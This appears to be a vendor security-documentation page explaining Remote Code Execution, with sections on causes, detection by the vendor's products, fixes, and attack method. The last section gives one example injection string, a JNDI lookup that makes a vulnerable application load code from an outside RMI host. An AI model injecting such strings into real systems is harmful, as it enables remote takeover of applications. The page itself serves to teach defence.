---
title: Remote Code Execution (RCE)
---

## What Is It?

Remote Code Execution occurs when a remote attacker can cause your application to reach out to another source to obtain instructions, often either a script or binary.

RCE is a common name that overlaps with similar vulnerability categories like [deserialization](deserialization.md)

## When Can It Affect My Application?

Remote Code Execution is commonly found in utilities where software engages remote code or allows items to be loaded. Common occurrences are often around Remote Method Invocation or dynamic loading utilities.

## How Do I Know If and Where I Have This Vulnerability?

Contrast Assess monitors execution and can detect Remote Code Execution vulnerabilities.

Contrast Protect can defend Remote Code Execution vulnerabilities.

## How Do I Fix It?

Developers should avoid frameworks that dynamically load remote code. Operators should harden an environment, preventing it from reaching out to remote sources outside its network or VPC.

## How Do People Attack Using This Flaw?
Attackers often inject Strings into applications that can be interpreted as something to load and run.

```
${jndi:rmi://192.168.2.106:1099/vccvhr}
```